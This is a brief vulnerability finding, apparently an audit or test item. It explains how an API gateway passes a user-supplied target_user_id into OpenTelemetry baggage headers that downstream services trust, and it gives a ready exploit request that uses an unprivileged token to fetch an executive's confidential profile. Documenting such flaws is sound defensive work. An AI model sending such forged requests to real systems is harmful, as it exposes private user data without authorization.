diagnosis: The API gateway proxy endpoint injects target_user_id from the user request payload into downstream OpenTelemetry baggage headers. Because downstream microservices authenticate and resolve user profiles using baggage user_id, an attacker can specify any target_user_id to retrieve confidential profile data from internal services.
exploit_request:
POST /proxy/downstream/service-call HTTP/1.1
Host: gateway.internal.io
Authorization: Bearer <unprivileged_user_token>
Content-Type: application/json

{"target_user_id": "usr_ceo_internal_01", "reason": "account_inquiry"}
